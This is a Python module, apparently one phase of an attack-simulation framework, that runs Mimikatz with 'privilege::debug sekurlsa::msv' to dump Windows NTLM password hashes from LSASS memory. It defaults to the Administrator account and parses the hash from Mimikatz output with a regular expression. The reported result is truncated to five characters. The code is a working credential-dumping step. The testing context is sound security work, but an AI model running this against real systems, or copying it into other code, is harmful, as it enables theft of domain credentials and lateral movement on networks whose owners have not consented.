import re
import logging
try:
  # noinspection PyUnresolvedReferences
  import aipythonlib
except Exception as e:
  logging.error('Error importing aipythonlib: {0}'.format(e))
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import StringUtils, PathUtils, NetworkUtils

class GetPasswordHashPhaseClass(AbstractPhaseClass):
  TrackerId = "128"
  Subject = "Dump Windows password hash"
  Description = "Dump Windows password hash"

  MIMIKATZ_BINARY_NAME = 'mimikatz.exe'

  def __init__(self, isPhaseCritical, username='', fqdn=''):
    AbstractPhaseClass.__init__(self, isPhaseCritical)
    logging.info(Messages.INFO1)
    self.Username = self._SetupUser(username)
    self.FQDN = self._SetupFQDN(fqdn)
    self.Domain = self._GetDomainFromFQDN(self.FQDN)
    self.DomainPreWindows2000 = self.Domain[:15]
    self.PasswordHash = None

  def Setup(self):
    if not PathUtils.FindFile(self.MIMIKATZ_BINARY_NAME):
      self.PhaseReporter.Error(Messages.ERROR1)
      return False
    if self._checkIfCriticalFailureAndLogIt():
        return False
    if StringUtils.IsEmptyOrNull(self.Username):
      self.PhaseReporter.Error(Messages.ERROR2)
      return False
    if StringUtils.IsEmptyOrNull(self.FQDN):
      self.PhaseReporter.Error(Messages.ERROR3)
      return False
    return True

  def Run(self):
    phaseSuccessful = self._GetPasswordHash()
    if phaseSuccessful:
      self.PhaseResult['password_hash (redacted)'] = self.PasswordHash[:5]
      self.PhaseReporter.Info(Messages.INFO8.format(self.Username))
      self.PhaseReporter.Report('Password hashes were retrieved from the LSASS (Local Security Authority Subsystem Service) process memory using Mimikatz')
    else:
      self.PhaseReporter.Info(Messages.INFO9.format(self.Username))
      self._checkIfCriticalFailureAndLogIt()
    return phaseSuccessful

  ###
  # Internal methods
  ###################

  def _GetPasswordHash(self):
    self.PhaseReporter.Info(Messages.INFO2.format(self.Username))
    commandline = 'privilege::debug sekurlsa::msv exit'
    timeout = 30000
    errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand(self.MIMIKATZ_BINARY_NAME, commandline, timeout)
    if errorCode == 0 and stdError == '' and exitCode == 0:
      return self._GetHashFromMimikatzOutput(stdOut)
    else:
      logging.warning(Messages.WARN1.format(exitCode, errorCode, stdError.strip()))
    return False

  def _GetHashFromMimikatzOutput(self, text):
    pattern = re.compile(r'''\* Username : %s\s*?\* Domain   : %s.*?\* NTLM     : (\w{32})''' % (self.Username,
                                                                                                 self.DomainPreWindows2000),
                         re.DOTALL | re.IGNORECASE)
    result = pattern.search(text)
    if result:
      self.PasswordHash = result.group(1)
    else:
      logging.error(Messages.ERROR4)
    return self.PasswordHash is not None

  def _SetupUser(self, user):
    param = str(user) or 'Administrator'
    if param:
      self.PhaseReporter.Info(Messages.INFO3.format(param))
    return param

  def _SetupFQDN(self, fqdn):
    param = str(fqdn) or NetworkUtils.GetMachineFQDN()
    if param:
      self.PhaseReporter.Info(Messages.INFO4.format(param))
    return param

  def _GetDomainFromFQDN(self, fqdn):
    return fqdn.split('.')[-2] if fqdn.find('.') != -1 else fqdn

  def _checkIfCriticalFailureAndLogIt(self):
    criticalError = False
    if not self.FQDN:
      self.PhaseReporter.Error(Messages.ERROR5)
      criticalError = True
    if criticalError:
      self._ShowRequirements()
    return criticalError

  def _isDCMachineNameCorrect(self, machineName):
    return machineName and machineName != '.' + self.FQDN

  def _ShowRequirements(self):
    self.PhaseReporter.Info('')
    self.PhaseReporter.Info(Messages.INFO5)
    self.PhaseReporter.Info(Messages.INFO6)
    self.PhaseReporter.Info(Messages.INFO7)


class Messages(object):

  INFO1 = 'Executing Get Password Hash Phase...'
  INFO2 = 'Reading {0} password hash from memory...'
  INFO3 = 'Username value to get password hash: {0}'
  INFO4 = 'FQDN value to get password hash: {0}'
  INFO5 = 'For this phase to succeed with the default parameters, these requirements should be satisfied:'
  INFO6 = '  1. The asset machine should be inside a windows domain.'
  INFO7 = '  2. The domain administrator password hash should be cached in the asset machine.'
  INFO8 = 'Successfully collected password hash of user: {0}'
  INFO9 = 'Failed to collect password hash of user: {0}'

  WARN1 = 'Mimikatz execution to retrieve NTLM hash was not successful. Exit Code: {0}, Error Code: {1}, Error Message: {2}'

  ERROR1 = 'mimikatz.exe not found in path. Phase will fail'
  ERROR2 = 'Username parameter was empty and its value could not be retrieved. Phase will fail'
  ERROR3 = 'FQDN parameter was empty and its value could not be retrieved. Phase will fail'
  ERROR4 = 'NTLM hash is not present in Mimikatz output'
  ERROR5 = 'FQDN could not be retrieved. Most probably the asset machine is not inside a Windows Domain.'
